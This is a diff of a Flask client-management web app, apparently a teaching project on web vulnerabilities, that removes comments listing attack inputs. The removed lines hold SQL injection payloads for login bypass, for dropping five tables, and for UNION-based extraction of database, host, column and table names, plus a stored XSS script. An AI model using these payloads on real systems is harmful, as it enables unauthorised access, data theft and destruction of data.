@@ -45,8 +45,6 @@ def index():
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
-    # todo to inject in login page insert username= ' or 1=1 -- password doesn't mind
-
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
@@ -75,7 +73,6 @@ def logout():
 
 @app.route('/register', methods=['GET', 'POST'])
 def register():
-    # todo: to delete most of the tables: insert in username:   a','b','c'); DROP TABLE user_sectors;  DROP TABLE password_history; DROP TABLE user_info; DROP TABLE clients; DROP TABLE users;--
     _, salt_len = get_password_policy()
     if request.method == 'POST':
         new_username = request.form.get('username')
@@ -124,8 +121,6 @@ def dashboard():
 
 @app.route('/add_new_client', methods=['GET', 'POST'])
 def add_new_client():
-    # todo: 1.	הצגת דוגמא לשימוש בהתקפה מסוג Stored XSS בסעיף 4 מחלק א
-    # todo: write  <script>alert('you are hacked!!')</script> in username
     if 'username' not in session:
         return redirect(url_for('login'))
 
@@ -232,22 +227,6 @@ def password_reset():
 
 @app.route('/search_client_data', methods=['POST'])
 def search_client_data():
-    # todo: to get all clients insert in username  ' or 1=1 --
-    '''
-    GET DB NAME:
-    a' UNION ALL SELECT NULL, NULL, NULL, NULL,  NULL, NULL, NULL, NULL,DB_NAME();--
-
-    GET HOST NAME:
-    a' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,(HOST_NAME());--
-
-    GET COLUMNS NAMES:
-    a' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,(SELECT column_name + ', ' AS 'data()' FROM information_schema.columns FOR XML PATH(''));--
-
-    GET TABLE NAMES:
-    a' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,(SELECT name  + ', ' AS 'data()' FROM CommunicationLTD..sysobjects WHERE xtype = 'U' FOR XML PATH(''));--
-
-    '''
-
     client_first_name = request.form.get('first_name')
     client_last_name = request.form.get('last_name')
     client_data = get_client_data_by_name(client_first_name, client_last_name)
